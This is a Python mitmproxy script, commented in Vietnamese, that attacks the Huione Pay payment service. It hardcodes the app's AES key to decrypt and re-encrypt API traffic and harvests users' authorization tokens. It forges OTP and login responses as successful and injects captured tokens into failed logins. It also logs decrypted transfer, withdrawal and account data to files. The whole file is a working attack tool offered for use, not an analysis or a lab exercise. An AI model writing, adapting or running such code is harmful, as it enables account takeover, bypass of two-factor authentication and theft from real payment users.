#!/usr/bin/env python3
"""
mitm_huione.py - MITM Script cho mitmproxy de bypass OTP Huione Pay
====================================================================
Intercept va modify API responses tu Huione Pay server.

Usage:
  mitmproxy -s mitm_huione.py
  mitmweb -s mitm_huione.py
  mitmdump -s mitm_huione.py

Chuc nang:
  1. Log tat ca request/response Huione Pay (AES decrypt)
  2. Bypass OTP: Modify sendCode response -> success
  3. Bypass OTP: Modify login response -> inject valid token
  4. Bypass version check: Modify response headers
  5. Dump tat ca API traffic vao file JSONL
"""

import json
import os
import base64
from datetime import datetime

from mitmproxy import http, ctx

# ============================================================
# AES Decryption (same as api_bridge.py)
# ============================================================
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

HUIONE_AES_KEY = b"keyhead_project_xhui_one_keytail"

def aes_decrypt(data_str):
    if not HAS_CRYPTO or not data_str:
        return data_str
    try:
        raw = base64.b64decode(data_str)
        cipher = AES.new(HUIONE_AES_KEY, AES.MODE_ECB)
        decrypted = unpad(cipher.decrypt(raw), AES.block_size)
        return decrypted.decode('utf-8')
    except Exception as e:
        return f"[decrypt_error: {e}] {data_str}"

def aes_encrypt(data_str):
    if not HAS_CRYPTO:
        return data_str
    try:
        cipher = AES.new(HUIONE_AES_KEY, AES.MODE_ECB)
        padded = pad(data_str.encode('utf-8'), AES.block_size)
        encrypted = cipher.encrypt(padded)
        return base64.b64encode(encrypted).decode('utf-8')
    except Exception as e:
        ctx.log.error(f"Encrypt error: {e}")
        return data_str

# ============================================================
# Config
# ============================================================
HUIONE_DOMAINS = [
    "app.hh3721.com",
    "open.huione.com",
    "pay2.huione.com",
]

LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dumps")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, f"mitm_traffic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl")

BYPASS_OTP = True
BYPASS_LOGIN = True
INJECT_TOKEN = None
CAPTURED_TOKENS = []

# ============================================================
# Helpers
# ============================================================
def log_entry(entry):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(json.dumps(entry, ensure_ascii=False, default=str) + '\n')
    except Exception as e:
        ctx.log.error(f"Log write error: {e}")

def is_huione(flow):
    host = flow.request.pretty_host
    return any(d in host for d in HUIONE_DOMAINS) or "hh3721.com" in host

def get_endpoint(url):
    return url.split("/")[-1].split("?")[0] if "/" in url else url

# ============================================================
# Addon
# ============================================================
class HuioneMITM:

    def load(self, loader):
        ctx.log.info("=" * 60)
        ctx.log.info("[HUIONE MITM] Script loaded")
        ctx.log.info(f"[HUIONE MITM] Log: {LOG_FILE}")
        ctx.log.info(f"[HUIONE MITM] OTP Bypass: {'ON' if BYPASS_OTP else 'OFF'}")
        ctx.log.info(f"[HUIONE MITM] AES: {'OK' if HAS_CRYPTO else 'MISSING'}")
        ctx.log.info("=" * 60)

    def request(self, flow: http.HTTPFlow):
        if not is_huione(flow):
            return

        url = flow.request.pretty_url
        endpoint = get_endpoint(url)

        entry = {
            "ts": datetime.now().isoformat(),
            "type": "req",
            "method": flow.request.method,
            "url": url,
            "headers": dict(flow.request.headers),
        }

        body = flow.request.get_text()
        if body:
            try:
                body_json = json.loads(body)
                entry["body"] = body_json
                if isinstance(body_json, dict) and "data" in body_json and isinstance(body_json["data"], str):
                    dec = aes_decrypt(body_json["data"])
                    try:
                        entry["body_dec"] = json.loads(dec)
                    except:
                        entry["body_dec"] = dec
            except:
                entry["body_raw"] = body[:2000]

        log_entry(entry)

        # Capture token
        global INJECT_TOKEN
        auth = flow.request.headers.get("Authorization", "")
        if auth and "@" in auth and len(auth) > 50:
            if auth not in CAPTURED_TOKENS:
                CAPTURED_TOKENS.append(auth)
                INJECT_TOKEN = auth
                ctx.log.info(f"[CAPTURE] Token: {auth[:60]}...")

        ctx.log.info(f"[->] {flow.request.method} {endpoint}")

    def response(self, flow: http.HTTPFlow):
        if not is_huione(flow):
            return

        url = flow.request.pretty_url
        endpoint = get_endpoint(url)

        body = flow.response.get_text()
        resp = None
        try:
            resp = json.loads(body) if body else None
        except:
            pass

        entry = {
            "ts": datetime.now().isoformat(),
            "type": "resp",
            "url": url,
            "status": flow.response.status_code,
        }

        if resp:
            entry["body"] = resp
            if isinstance(resp, dict) and resp.get("data") and isinstance(resp["data"], str) and len(resp["data"]) > 20:
                dec = aes_decrypt(resp["data"])
                try:
                    entry["body_dec"] = json.loads(dec)
                except:
                    entry["body_dec"] = dec
        else:
            entry["body_raw"] = (body or "")[:2000]

        log_entry(entry)

        code = resp.get("code", "?") if resp else flow.response.status_code
        msg = resp.get("msg", "") if resp else ""
        ctx.log.info(f"[<-] {endpoint} code={code} {msg}")

        if not resp or not isinstance(resp, dict):
            return

        # ====================================================
        # BYPASS: sendCode -> force success
        # ====================================================
        if BYPASS_OTP and "sendCode" in url:
            ctx.log.warn(f"[BYPASS] sendCode: original code={resp.get('code')}")
            resp["code"] = "0"
            resp["success"] = True
            resp["msg"] = "success"
            resp["data"] = None
            flow.response.set_text(json.dumps(resp))
            ctx.log.warn("[BYPASS] sendCode -> SUCCESS")
            log_entry({"ts": datetime.now().isoformat(), "type": "BYPASS", "action": "sendCode"})

        # ====================================================
        # BYPASS: login -> inject token if we have one
        # ====================================================
        if BYPASS_LOGIN and "foundation/user/login" in url and "loginBefore" not in url:
            ctx.log.warn(f"[BYPASS] login: original code={resp.get('code')}")

            # If login succeeded, capture token
            if resp.get("code") == "0" and resp.get("data"):
                dec = aes_decrypt(resp["data"])
                try:
                    login_data = json.loads(dec)
                    if "token" in login_data:
                        pid = login_data.get("productInstanceId", "")
                        tok = f"{pid}@{login_data['token']}" if pid else login_data["token"]
                        CAPTURED_TOKENS.append(tok)
                        global INJECT_TOKEN
                        INJECT_TOKEN = tok
                        ctx.log.warn(f"[CAPTURE] Login token: {tok[:60]}...")
                except:
                    pass

            # If login failed and we have a token, inject it
            elif INJECT_TOKEN and resp.get("code") != "0":
                parts = INJECT_TOKEN.split("@", 1) if "@" in INJECT_TOKEN else ["1702010981448654849", INJECT_TOKEN]
                login_payload = json.dumps({
                    "token": parts[1] if len(parts) > 1 else parts[0],
                    "productInstanceId": parts[0] if len(parts) > 1 else "1702010981448654849",
                })
                resp["code"] = "0"
                resp["success"] = True
                resp["msg"] = "success"
                resp["data"] = aes_encrypt(login_payload)
                flow.response.set_text(json.dumps(resp))
                ctx.log.warn("[BYPASS] login -> INJECTED TOKEN")
                log_entry({"ts": datetime.now().isoformat(), "type": "BYPASS", "action": "login_inject"})

        # ====================================================
        # BYPASS: loginBefore -> force success
        # ====================================================
        if "loginBefore" in url and resp.get("code") != "0":
            resp["code"] = "0"
            resp["success"] = True
            resp["msg"] = "success"
            flow.response.set_text(json.dumps(resp))
            ctx.log.warn("[BYPASS] loginBefore -> SUCCESS")

        # ====================================================
        # LOG: heartbeat status
        # ====================================================
        if "heartbeat" in url:
            if resp.get("code") == "100001":
                ctx.log.warn("[INFO] Token EXPIRED")
            elif resp.get("code") == "0":
                ctx.log.info("[INFO] Token ALIVE")

        # ====================================================
        # LOG: finance operations (decrypt)
        # ====================================================
        if any(kw in url for kw in ["transfer", "withdraw", "recharge", "account", "bill"]):
            ctx.log.info(f"[FINANCE] {endpoint} code={code}")
            if resp.get("data") and isinstance(resp["data"], str):
                dec = aes_decrypt(resp["data"])
                ctx.log.info(f"[FINANCE] Data: {dec[:300]}")


addons = [HuioneMITM()]
